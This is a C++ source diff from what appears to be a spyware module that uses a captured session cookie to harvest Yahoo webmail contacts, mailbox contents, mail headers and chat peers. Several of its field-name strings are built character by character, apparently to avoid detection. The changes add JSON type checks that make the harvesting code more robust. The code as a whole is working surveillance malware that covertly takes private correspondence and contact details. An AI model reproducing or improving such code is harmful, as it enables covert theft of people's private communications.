@@ -328,6 +328,9 @@ DWORD YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams)
 				{	
 					bIsContact = FALSE;
 
+					if(!jContacts[i]->IsObject())
+						continue;
+
 					//contact object
 					jObj = jContacts[i]->AsObject();
 
@@ -358,6 +361,9 @@ DWORD YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams)
 							//object with contact values
 							jObj = jFields[j]->AsObject();
 
+							if(!jObj[strType]->IsString())
+								continue;
+
 							//get the obj type (name or email)
 							_snwprintf_s(strBuffer, sizeof(strBuffer)/2, _TRUNCATE, L"%s", jObj[strType]->AsString().c_str());
 							
@@ -368,51 +374,63 @@ DWORD YHLogContacts(LPSTR strContacts, LPYAHOO_CONNECTION_PARAMS pYHParams)
 									continue;
 								jObj = jObj[strValue]->AsObject();
 
-								dwLen = wcslen(jObj[strName]->AsString().c_str()) + wcslen(jObj[strLastName]->AsString().c_str()) + 2; //(insert a blank char between name and lastname)
-								YHContact.strName = (LPWSTR)zalloc(dwLen * (sizeof(WCHAR)));
-								if(YHContact.strName != NULL)
+								if(jObj[strName]->IsString() && jObj[strLastName]->IsString())
 								{
-									_snwprintf_s(YHContact.strName, dwLen, _TRUNCATE, L"%s %s", jObj[strName]->AsString().c_str(), jObj[strLastName]->AsString().c_str());
-									bIsContact = TRUE;
+									dwLen = wcslen(jObj[strName]->AsString().c_str()) + wcslen(jObj[strLastName]->AsString().c_str()) + 2; //(insert a blank char between name and lastname)
+									YHContact.strName = (LPWSTR)zalloc(dwLen * (sizeof(WCHAR)));
+									if(YHContact.strName != NULL)
+									{
+										_snwprintf_s(YHContact.strName, dwLen, _TRUNCATE, L"%s %s", jObj[strName]->AsString().c_str(), jObj[strLastName]->AsString().c_str());
+										bIsContact = TRUE;
+									}
+									else
+										bError = TRUE;		
 								}
-								else
-									bError = TRUE;							
 							}
 							else if(!wcscmp(strBuffer, L"email"))
 							{
-								dwLen = wcslen(jObj[strEmail]->AsString().c_str()) + 1;
-								YHContact.strEmail = (LPWSTR)zalloc(dwLen * (sizeof(WCHAR)));
-								if(YHContact.strEmail != NULL)
+								if(jObj[strEmail]->IsString())
 								{
-									_snwprintf_s(YHContact.strEmail, dwLen, _TRUNCATE, L"%s", jObj[strEmail]->AsString().c_str());
-									bIsContact = TRUE;
+									dwLen = wcslen(jObj[strEmail]->AsString().c_str()) + 1;
+									YHContact.strEmail = (LPWSTR)zalloc(dwLen * (sizeof(WCHAR)));
+									if(YHContact.strEmail != NULL)
+									{
+										_snwprintf_s(YHContact.strEmail, dwLen, _TRUNCATE, L"%s", jObj[strEmail]->AsString().c_str());
+										bIsContact = TRUE;
+									}
+									else
+										bError = TRUE;		
 								}
-								else
-									bError = TRUE;								
 							}						
 							else if(!wcscmp(strBuffer, L"company"))
-							{							
-								dwLen = wcslen(jObj[strValue]->AsString().c_str()) + 1;
-								YHContact.strCompany = (LPWSTR)malloc(dwLen * (sizeof(WCHAR)));
-								if(YHContact.strCompany != NULL)
+							{	
+								if(jObj[strValue]->IsString())
 								{
-									_snwprintf_s(YHContact.strCompany, dwLen, _TRUNCATE, L"%s", jObj[strValue]->AsString().c_str());
-									bIsContact = TRUE;
+									dwLen = wcslen(jObj[strValue]->AsString().c_str()) + 1;
+									YHContact.strCompany = (LPWSTR)malloc(dwLen * (sizeof(WCHAR)));
+									if(YHContact.strCompany != NULL)
+									{
+										_snwprintf_s(YHContact.strCompany, dwLen, _TRUNCATE, L"%s", jObj[strValue]->AsString().c_str());
+										bIsContact = TRUE;
+									}
+									else
+										bError = TRUE;
 								}
-								else
-									bError = TRUE;
 							}
 							else if(!wcscmp(strBuffer, L"phone"))
 							{
-								dwLen = wcslen(jObj[strValue]->AsString().c_str()) + 1;
-								YHContact.strPhone = (LPWSTR)malloc(dwLen * (sizeof(WCHAR)));
-								if(YHContact.strPhone != NULL)
-								{									
-									_snwprintf_s(YHContact.strPhone, dwLen, _TRUNCATE, L"%s", jObj[strValue]->AsString().c_str());
-									bIsContact = TRUE;									
+								if(jObj[strValue]->IsString())
+								{
+									dwLen = wcslen(jObj[strValue]->AsString().c_str()) + 1;
+									YHContact.strPhone = (LPWSTR)malloc(dwLen * (sizeof(WCHAR)));
+									if(YHContact.strPhone != NULL)
+									{									
+										_snwprintf_s(YHContact.strPhone, dwLen, _TRUNCATE, L"%s", jObj[strValue]->AsString().c_str());
+										bIsContact = TRUE;									
+									}
+									else
+										bError = TRUE;	
 								}
-								else
-									bError = TRUE;	
 							}
 
 							//in case of alloc error, free the heap and exit
@@ -605,8 +623,14 @@ DWORD YHParseMailBox(LPSTR strMailBoxName, LPSTR strCookie, LPYAHOO_CONNECTION_P
 	//backward loop to get mails	
 	for(iItem=dwNrOfMails; iItem>0; iItem--)
 	{
+		if(!jMail[iItem-1]->IsObject())
+			continue;
+
 		//messageinfo obj
 		jObj = jMail[iItem-1]->AsObject();
+
+		if(!jObj[strMID]->IsString())
+			continue;
 
 		//mail id
 		dwLen = wcslen(jObj[strMID]->AsString().c_str()) + 1;
@@ -1015,6 +1039,9 @@ DWORD YHGetMailHeader(LPSTR strMailID, LPYAHOO_CONNECTION_PARAMS pYHParams, LPST
 
 				for(dwTotSize=0, i=0; i<jHeader.size(); i++)
 				{	
+					if(!jHeader[i]->IsString())
+						continue;
+
 					//length of header
 					dwSize = wcslen(jHeader[i]->AsString().c_str());
 					if(dwSize == 0)
@@ -1509,6 +1536,9 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 		//get all the contacted peers
 		for(i=0; i<jArray.size(); i++)
 		{
+			if(!jArray[i]->IsObject())
+				continue;
+
 			//get obj
 			jObj = jArray[i]->AsObject();
 
@@ -1559,6 +1589,9 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 		//get all the contacted peers
 		for(i=0; i<jArray.size(); i++)
 		{
+			if(!jArray[i]->IsObject())
+				continue;
+
 			//get obj
 			jObj = jArray[i]->AsObject();
 
@@ -1610,6 +1643,9 @@ DWORD YHGetChatInfo(__out LPYAHOO_CHAT_FIELDS lpChatFields, __in JSONObject pjHe
 		//get all the contacted peers
 		for(i=0; i<jArray.size(); i++)
 		{
+			if(!jArray[i]->IsObject())
+				continue;
+
 			//get obj
 			jObj = jArray[i]->AsObject();
 
@@ -2568,6 +2604,8 @@ DWORD YHExtractMailFields(JSONObject jMail, LPYAHOO_MAIL_FIELDS lpMailFields, LP
 	WCHAR strTypeFld[]			= { L't', L'y', L'p', L'e', L'\0' };																//value
 	WCHAR strTypeParamsFld[]	= { L't', L'y', L'p', L'e', L'P', L'a', L'r', L'a', L'm', L's', L'\0' };							//value
 	
+	if(!jMail[strPartIdFld]->IsString())
+		return YAHOO_SKIP;
 
 	//get the obj part
 	_snwprintf_s(strBuffer, sizeof(strBuffer)/2, _TRUNCATE, L"%s", jMail[strPartIdFld]->AsString().c_str());
@@ -2738,6 +2776,9 @@ DWORD YHExtractChatFields(JSONObject jMail, LPYAHOO_CHAT_FIELDS lpChatFields)
 	WCHAR strTextFld[]		= { L't', L'e', L'x', L't', L'\0' };					//value
 	WCHAR strTypeFld[]		= { L't', L'y', L'p', L'e', L'\0' };					//value	
 	
+	if(!jMail[strPartIdFld]->IsString())
+		return YAHOO_SKIP;
+
 	//get the obj part
 	_snwprintf_s(strBuffer, sizeof(strBuffer)/2, _TRUNCATE, L"%s", jMail[strPartIdFld]->AsString().c_str());
 
@@ -3009,6 +3050,9 @@ DWORD YahooMessageHandler(LPSTR strCookie)
 		//folderInfo object
 		jObj = jObj[strFolderInfoFld]->AsObject();
 		
+		if(!jObj[strFidFld]->IsString())
+			continue;
+
 		//convert folder name to LPSTR
 		dwLen = wcslen(jObj[strFidFld]->AsString().c_str()) + 1;
 		strFolderName = (LPSTR)zalloc(dwLen);
